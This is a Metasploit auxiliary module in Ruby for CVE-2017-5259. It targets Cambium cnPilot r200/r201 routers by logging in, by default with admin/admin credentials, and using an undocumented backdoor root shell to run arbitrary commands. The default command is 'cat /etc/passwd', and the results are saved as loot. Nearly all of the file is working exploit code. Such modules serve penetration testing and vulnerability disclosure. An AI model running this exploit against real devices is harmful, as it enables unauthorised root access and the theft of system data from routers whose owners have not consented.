##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::CNPILOT

  def initialize(info = {})
    super(update_info(info,
      'Name' => "Cambium cnPilot r200/r201 Command Execution as 'root'",
      'Description' => %{
        Cambium cnPilot r200/r201 device software versions 4.2.3-R4 to
        4.3.3-R4, contain an undocumented, backdoor 'root' shell. This shell is
        accessible via a specific url, to any authenticated user. The module uses this
        shell to execute arbitrary system commands as 'root'.
      },
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'References' =>
        [
          ['CVE', '2017-5259'],
          ['URL', 'https://blog.rapid7.com/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities']
        ],
      'License' => MSF_LICENSE
     )
    )

    register_options(
      [
        OptInt.new('TIMEOUT', [true, 'HTTP connection timeout', 10]),
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'admin']),
        OptString.new('CMD', [true, 'Command(s) to run', 'cat /etc/passwd'])
      ], self.class
    )

    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
  end

  def run_host(ip)
    unless is_app_cnpilot?
      return
    end
  end

  # command execution happens here

  def cmd_exec_run(the_cookie)
    # Verify backdoor 'root' shell url exists
    root_shell = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + '/adm/syscmd.asp'
    print_status("#{rhost}:#{rport} - Checking backdoor 'root' shell...")

    res = send_request_cgi(
      {
        'uri' => '/adm/syscmd.asp',
        'method' => 'GET',
        'cookie' => the_cookie,
        'headers' => {
          'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
      }
    )

    # Now POST the command
    if res && res.code == 200
      uri1 = '/goform/SystemCommand'
      inject_cmd = datastore['CMD']
      print_good("#{rhost}:#{rport} - You can access the 'root' shell at: #{root_shell}")
      print_good("#{rhost}:#{rport} - Executing command - #{inject_cmd}")

      send_request_cgi(
        {
          'uri' => uri1,
          'method' => 'POST',
          'cookie' => the_cookie,
          'headers' => {
            'Accept' => '*/*',
            'Accept-Language' => 'en-US,en;q=0.5',
            'Accept-Encoding' => 'gzip, deflate',
            'Connection' => 'keep-alive'
          },
          'vars_post' =>
            {
              'command' => inject_cmd,
              'SystemCommandSubmit' => 'Apply'
            }
        }
      )

      # Results are populated in the first url, so GET it once more
      res = send_request_cgi(
        {
          'uri' => '/adm/syscmd.asp',
          'method' => 'GET',
          'cookie' => the_cookie,
          'headers' => {
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
          }
        }
      )

      html = Nokogiri::HTML(res.body)
      search_result = html.search('textarea').text

      if search_result.nil?
        print_status('Command run did not return any results or invalid command. Note that cnPilot devices only have a restricted *nix command-set.')
      else
        print_good("#{search_result}")

        # w00t we got l00t
        loot_name = 'cmd-exec-log'
        loot_type = 'text/plain'
        loot_desc = 'Cambium cnPilot CMD Exec Results'
        data = "#{search_result}"
        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc)
        print_good("File saved in: #{p}")
      end
    else
      print_error("#{rhost}:#{rport} - Backdoor 'root' shell not found. Affected versions are - v4.2.3-R4 and newer. You can try to verify the shell at #{root_shell}")
      return
    end
  end

  #
  # Login & initiate cmd_exec_run
  #

  def run_login
    cookie, cnpilot_version = do_login(datastore['USERNAME'], datastore['PASSWORD'])
    if cookie == 'skip' && cnpilot_version == 'skip'
      return
    elsif ['4.2.3-R4', '4.3.1-R1', '4.3.2-R4', '4.3.3-R4'].include?(cnpilot_version.to_s)
      cmd_exec_run(cookie)
    else
      vprint_error("#{rhost}:#{rport} - This software version is not vulnerable. Affected versions are - v4.2.3-R4 and newer.")
    end
  end
end
